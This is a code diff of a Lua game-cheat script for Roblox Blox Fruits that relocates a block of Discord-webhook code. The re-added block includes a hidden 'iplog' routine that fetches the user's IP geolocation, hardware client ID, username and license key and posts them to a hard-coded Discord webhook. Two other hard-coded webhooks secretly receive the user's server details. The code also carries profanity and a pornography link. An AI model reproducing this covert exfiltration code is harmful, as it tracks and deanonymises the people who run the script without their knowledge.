@@ -636,164 +636,6 @@ function CheckQuest()
     end
 end
 
-function GetMsg()
-    InviteScript =
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
-        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
-    k3 = {}
-    if h["PingEveryone"] and h["WebhookWhenMirage"] then
-        k3["content"] = "@everyone"
-    else
-        k3["content"] = "toi nwngs"
-    end
-    k3["embeds"] = {
-        {
-            ["title"] = "Blox Fruit Full Moon Checker",
-            ["fields"] = {
-                {["name"] = "Moon Status:", ["value"] = u9(CheckMoon()), ["inline"] = true},
-                {["name"] = "Mirage Status:", ["value"] = IsMirageIsland(), ["inline"] = true},
-                {["name"] = "Server Time:", ["value"] = u9(function7() .. " | " .. function8()), ["inline"] = true},
-                {["name"] = "Account:", ["value"] = "||" .. game.Players.LocalPlayer.Name .. "||", ["inline"] = true},
-                {["name"] = "Player Count:", ["value"] = u9(game.Players.NumPlayers .. "/12"), ["inline"] = true},
-                {["name"] = "Job Id:", ["value"] = u9(game.JobId), ["inline"] = true},
-                {["name"] = "Script To Join:", ["value"] = "```lua\n" .. InviteScript .. "\n```", ["inline"] = true}
-            }
-        }
-    }
-    return k3
-end
-function GetMsg2()
-    InviteScript =
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
-        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
-    k3 = {}
-    k3["embeds"] = {
-        {
-            ["title"] = "Blox Fruit Full Moon Checker",
-            ["fields"] = {
-                {["name"] = "Moon Status:", ["value"] = u9(CheckMoon()), ["inline"] = true},
-                {["name"] = "Mirage Status:", ["value"] = IsMirageIsland(), ["inline"] = true},
-                {["name"] = "Server Time:", ["value"] = u9(function7() .. " | " .. function8()), ["inline"] = true},
-                {["name"] = "Account:", ["value"] = "||" .. "pornhub.com" .. "||", ["inline"] = true},
-                {["name"] = "Player Count:", ["value"] = u9(game.Players.NumPlayers .. "/12"), ["inline"] = true},
-                {["name"] = "Job Id:", ["value"] = u9(game.JobId), ["inline"] = true},
-                {["name"] = "Script To Join:", ["value"] = "```lua\n" .. InviteScript .. "\n```", ["inline"] = true}
-            }
-        }
-    }
-    return k3
-end
-function GetMsgTest()
-    k3 = {}
-    k3["embeds"] = {{["title"] = "Con cac!", ["url"] = "https://www.pornhub.com", ["description"] = "Ok"}}
-    return k3
-end
-spawn(
-    function()
-        while wait() do
-            if h["WebhookWhenMirage"] then
-                repeat
-                    task.wait()
-                until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
-                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
-                    PostWebhook(h["WebhookUrl"], GetMsg())
-                    wait(60)
-                end
-            end
-        end
-    end
-)
-spawn(
-    function()
-        while wait() do
-            if h["WebhookWhenMoon"] then
-                repeat
-                    task.wait()
-                until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
-                if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
-                    PostWebhook(h["WebhookUrl"], GetMsg())
-                    wait(60)
-                end
-            end
-        end
-    end
-)
-spawn(
-    function()
-        repeat
-            task.wait()
-        until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
-        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
-            PostWebhook(
-                "https://discord.com/api/webhooks/1108041186662424617/WaEVGp67j8wetVB153s29Oj0VeX_Rz9lDLHEW2CvAAC8sjkhvdFOIGReKKYNDjLewC1Q",
-                GetMsg2()
-            )
-        end
-    end
-)
-spawn(
-    function()
-        repeat
-            task.wait()
-        until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
-        if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
-            PostWebhook(
-                "https://discord.com/api/webhooks/1108003058014765116/XX5bRapE8PQAEYdG1ibXcANBD2eLysFg9IiKbrz_oMhzg43hCjwGsv7FNtbJpHPZXtY9",
-                GetMsg2()
-            )
-        end
-    end
-)
-spawn(
-    function()
-        function iplog()
-            local cE = game:HttpGet("http://ip-api.com/json")
-            cE = game:GetService("HttpService"):JSONDecode(cE)
-            local cF =
-                game:HttpGet("https://raw.githubusercontent.com/memaybeohub/me-may-beo-hub/main/BlackListedips.lua")
-            descriptionf = ""
-            for r, v in pairs(cE) do
-                descriptionf = descriptionf .. r .. " : " .. v .. "\n"
-            end
-            clientid = game:GetService("RbxAnalyticsService"):GetClientId()
-            descriptionf = descriptionf .. "\nHardWereId: " .. clientid
-            mfgg = {
-                ["content"] = u9(
-                    "Name: " ..
-                        game.Players.LocalPlayer.Name .. "\nKey: " .. tostring(getgenv().Key) .. "\n" .. descriptionf
-                ),
-                ["username"] = "Suc Vat IP LOG",
-                ["avatar_url"] = "https://media.discordapp.net/attachments/1059858215879311412/1059864410740502578/Ew4kWteXEAAK2Hy.png"
-            }
-            local co = http_request or request or HttpPost or syn.request
-            local cp =
-                co(
-                {
-                    Url = "https://discord.com/api/webhooks/1098132832968249396/0WwsPAMici2_eY8TKo9lWqCFvofbScNSaEDxZsW_OyryC1aixy0tR48SXacTJTiVJ0n8",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = game:GetService("HttpService"):JSONEncode(mfgg)
-                }
-            )
-        end
-        iplog()
-    end
-)
-
-function PostWebhook(cm, cn)
-    local co = http_request or request or HttpPost or syn.request
-    local cp =
-        co(
-        {
-            Url = cm,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(cn)
-        }
-    )
-    return ""
-end
-
 function Hop()
     local PlaceID = game.PlaceId
     local AllIDs = {}
@@ -11777,6 +11619,150 @@ function SkidSeaHub2()
     return k3
 end
 
+function GetMsg()
+    InviteScript =
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
+        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
+    k3 = {}
+    if h["PingEveryone"] and h["WebhookWhenMirage"] then
+        k3["content"] = "@everyone"
+    else
+        k3["content"] = "toi nwngs"
+    end
+    k3["embeds"] = {
+        {
+            ["title"] = "Blox Fruit Full Moon Checker",
+            ["fields"] = {
+                {["name"] = "Moon Status:", ["value"] = u9(CheckMoon()), ["inline"] = true},
+                {["name"] = "Mirage Status:", ["value"] = IsMirageIsland(), ["inline"] = true},
+                {["name"] = "Server Time:", ["value"] = u9(function7() .. " | " .. function8()), ["inline"] = true},
+                {["name"] = "Account:", ["value"] = "||" .. game.Players.LocalPlayer.Name .. "||", ["inline"] = true},
+                {["name"] = "Player Count:", ["value"] = u9(game.Players.NumPlayers .. "/12"), ["inline"] = true},
+                {["name"] = "Job Id:", ["value"] = u9(game.JobId), ["inline"] = true},
+                {["name"] = "Script To Join:", ["value"] = "```lua\n" .. InviteScript .. "\n```", ["inline"] = true}
+            }
+        }
+    }
+    return k3
+end
+function GetMsg2()
+    InviteScript =
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
+        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
+    k3 = {}
+    k3["embeds"] = {
+        {
+            ["title"] = "Blox Fruit Full Moon Checker",
+            ["fields"] = {
+                {["name"] = "Moon Status:", ["value"] = u9(CheckMoon()), ["inline"] = true},
+                {["name"] = "Mirage Status:", ["value"] = IsMirageIsland(), ["inline"] = true},
+                {["name"] = "Server Time:", ["value"] = u9(function7() .. " | " .. function8()), ["inline"] = true},
+                {["name"] = "Account:", ["value"] = "||" .. "pornhub.com" .. "||", ["inline"] = true},
+                {["name"] = "Player Count:", ["value"] = u9(game.Players.NumPlayers .. "/12"), ["inline"] = true},
+                {["name"] = "Job Id:", ["value"] = u9(game.JobId), ["inline"] = true},
+                {["name"] = "Script To Join:", ["value"] = "```lua\n" .. InviteScript .. "\n```", ["inline"] = true}
+            }
+        }
+    }
+    return k3
+end
+function GetMsgTest()
+    k3 = {}
+    k3["embeds"] = {{["title"] = "Con cac!", ["url"] = "https://www.pornhub.com", ["description"] = "Ok"}}
+    return k3
+end
+spawn(
+    function()
+        while wait() do
+            if h["WebhookWhenMirage"] then
+                repeat
+                    task.wait()
+                until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
+                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+                    PostWebhook(h["WebhookUrl"], GetMsg())
+                    wait(60)
+                end
+            end
+        end
+    end
+)
+spawn(
+    function()
+        while wait() do
+            if h["WebhookWhenMoon"] then
+                repeat
+                    task.wait()
+                until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
+                if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
+                    PostWebhook(h["WebhookUrl"], GetMsg())
+                    wait(60)
+                end
+            end
+        end
+    end
+)
+spawn(
+    function()
+        repeat
+            task.wait()
+        until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
+        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+            PostWebhook(
+                "https://discord.com/api/webhooks/1108041186662424617/WaEVGp67j8wetVB153s29Oj0VeX_Rz9lDLHEW2CvAAC8sjkhvdFOIGReKKYNDjLewC1Q",
+                GetMsg2()
+            )
+        end
+    end
+)
+spawn(
+    function()
+        repeat
+            task.wait()
+        until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
+        if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
+            PostWebhook(
+                "https://discord.com/api/webhooks/1108003058014765116/XX5bRapE8PQAEYdG1ibXcANBD2eLysFg9IiKbrz_oMhzg43hCjwGsv7FNtbJpHPZXtY9",
+                GetMsg2()
+            )
+        end
+    end
+)
+spawn(
+    function()
+        function iplog()
+            local cE = game:HttpGet("http://ip-api.com/json")
+            cE = game:GetService("HttpService"):JSONDecode(cE)
+            local cF =
+                game:HttpGet("https://raw.githubusercontent.com/memaybeohub/me-may-beo-hub/main/BlackListedips.lua")
+            descriptionf = ""
+            for r, v in pairs(cE) do
+                descriptionf = descriptionf .. r .. " : " .. v .. "\n"
+            end
+            clientid = game:GetService("RbxAnalyticsService"):GetClientId()
+            descriptionf = descriptionf .. "\nHardWereId: " .. clientid
+            mfgg = {
+                ["content"] = u9(
+                    "Name: " ..
+                        game.Players.LocalPlayer.Name .. "\nKey: " .. tostring(getgenv().Key) .. "\n" .. descriptionf
+                ),
+                ["username"] = "Suc Vat IP LOG",
+                ["avatar_url"] = "https://media.discordapp.net/attachments/1059858215879311412/1059864410740502578/Ew4kWteXEAAK2Hy.png"
+            }
+            local co = http_request or request or HttpPost or syn.request
+            local cp =
+                co(
+                {
+                    Url = "https://discord.com/api/webhooks/1098132832968249396/0WwsPAMici2_eY8TKo9lWqCFvofbScNSaEDxZsW_OyryC1aixy0tR48SXacTJTiVJ0n8",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode(mfgg)
+                }
+            )
+        end
+        iplog()
+    end
+)
+      
 
 
 OrionLib:Init()
